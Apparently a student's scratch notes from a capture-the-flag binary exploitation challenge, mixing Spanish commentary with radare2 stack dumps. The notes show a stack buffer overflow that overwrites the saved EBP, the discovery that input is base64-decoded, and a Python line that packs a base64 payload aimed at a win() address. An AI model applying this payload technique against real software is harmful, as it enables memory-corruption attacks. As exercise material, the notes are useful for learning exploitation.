
:> pxw 12 @ esp
0xffdabeb0  0xffdabed0 0x0811eb40 0x00000009             ....@.......
:> pxw @ esp
0xffdabeb0  0xffdabed0 0x0811eb40 0x00000009 0x0a11eaa8  ....@...........
0xffdabec0  0x0a11eaa8 0x0a11e9e8 0x00000009 0x00000009  ................
0xffdabed0  0x080481d0 0x00000000 0xffdabf28
 0x08049407  ........(.......
0xffdabee0  0x00000009 0x0a11e9b8 0x00000009 0x00000000  ................
0xffdabef0  0x00000001 0xffdabfb4 0x0a11e9b8 0x32310001  ..............12
0xffdabf00  0x36353433 0x30393837 0x00003231 0x00000000  3456789012......
0xffdabf10  0x00000000 0x00000000 0x00000000 0x00000009  ................
0xffdabf20  0x00000000 0x0811b00c 0x08059b50 0x08059614  ........P.......
0xffdabf30  0x00000001 0xffdabfb4 0xffdabfbc 0x00000000  ................
0xffdabf40  0xa54b1aef 0x080481d0 0x00000000 0x0811b00c  ..K.............
0xffdabf50  0x08059b50 0xb57e61ff 0x0b2ba010 0x00000000  P....a~...+.....
0xffdabf60  0x00000000                                   ....

:> dr
eax = 0xffdabed0
ebx = 0x080481d0
ecx = 0x00000000
edx = 0x00000000
esi = 0x00000000
edi = 0x0811b00c
esp = 0xffdabeb0
ebp = 0xffdabed8
eip = 0x080492ba
eflags = 0x00200292
oeax = 0xffffffff

----------------------------------------

:> pxw @ esp
0xffdabeb0  0xffdabed0 0x0811eb40 0x00000009 0x0a11eaa8  ....@...........
0xffdabec0  0x0a11eaa8 0x0a11e9e8 0x00000009 0x00000009  ................
0xffdabed0  0xe7f86dd7 0x4df7fcae 0xffdabf76 0x08049407  .m.....Mv.......
0xffdabee0  0x00000009 0x0a11e9b8 0x00000009 0x00000000  ................
0xffdabef0  0x00000001 0xffdabfb4 0x0a11e9b8 0x32310001  ..............12
0xffdabf00  0x36353433 0x30393837 0x00003231 0x00000000  3456789012......
0xffdabf10  0x00000000 0x00000000 0x00000000 0x00000009  ................
0xffdabf20  0x00000000 0x0811b00c 0x08059b50 0x08059614  ........P.......
0xffdabf30  0x00000001 0xffdabfb4 0xffdabfbc 0x00000000  ................
0xffdabf40  0xa54b1aef 0x080481d0 0x00000000 0x0811b00c  ..K.............
0xffdabf50  0x08059b50 0xb57e61ff 0x0b2ba010 0x00000000  P....a~...+.....
0xffdabf60  0x00000000                                   ....
:> dr
eax = 0xffdabed0
ebx = 0x080481d0
ecx = 0x00000000
edx = 0x00000000
esi = 0x00000000
edi = 0x0811b00c
esp = 0xffdabeb0
ebp = 0xffdabed8
eip = 0x080492bf
eflags = 0x00200202
oeax = 0xffffffff



0xffb0b010  0xffb0b030 0x0811eb40 0x0000000a 0x084c7aa8  0...@........zL.
0xffb0b020  0x084c7aa8 0x084c79e8 0x00000009 0x0000000a  .zL..yL.........
0xffb0b030  0x080481d0 0x00000000 0xffb0b088 0x08049407  ................

--------- 1234567890123

0xffb0b010  0xffb0b030 0x0811eb40 0x0000000a 0x084c7aa8  0...@........zL.
0xffb0b020  0x084c7aa8 0x084c79e8 0x00000009 0x0000000a  .zL..yL.........
0xffb0b030  0xe3b75dd3 0xddf3bb9e 0xffb00035 0x08049407  .]......5.......





0xffd114a0  0xffd114c0 0x0811eb40 0x0000000c 0x0958dab0  ....@.........X.
0xffd114b0  0x0958dab0 0x0958d9f0 0x0000000c 0x0000000c  ..X...X.........
0xffd114c0  0x080481d0 0x00000000 0xffd11518 0x08049407  ................


----12345678901234567
0xffd114a0  0xffd114c0 0x0811eb40 0x0000000c 0x0958dab0  ....@.........X.
0xffd114b0  0x0958dab0 0x0958d9f0 0x0000000c 0x0000000c  ..X...X.........
0xffd114c0  0xe7f86dd7 0x4df7fcae 0x7a8edf76 0x08049407  .m.....Mv..z....

con un input de 17 caracteres, sobre escribo todo el saved ebp


escribo

 XXXX win() (addr de XXXX)
 solo tengo que sobre escribir 3 chars del ebp
 es el misma addr m√°s: 0x58

brute force!

sobre escribo un solo byte y espero tener suerte?
ademas esta alineado, osea que el byte termina en 0

la duda es.. como carajo escribo lo que quiero escribir??
como se modifica mi input?

mi input modificado esta en: 0x0811eb40


123456789012
d76d f8e7 aefc f74d 76

es base64 decode....... dah
so...
input:
base64encode( 0x41414141 0x08049278 0xa0 )

In [8]: base64.b64encode(struct.pack("I", 0x41414141) + struct.pack("I", 0x08049278) + b"\xa0")                                                       
Out[8]: b'QUFBQXiSBAig'
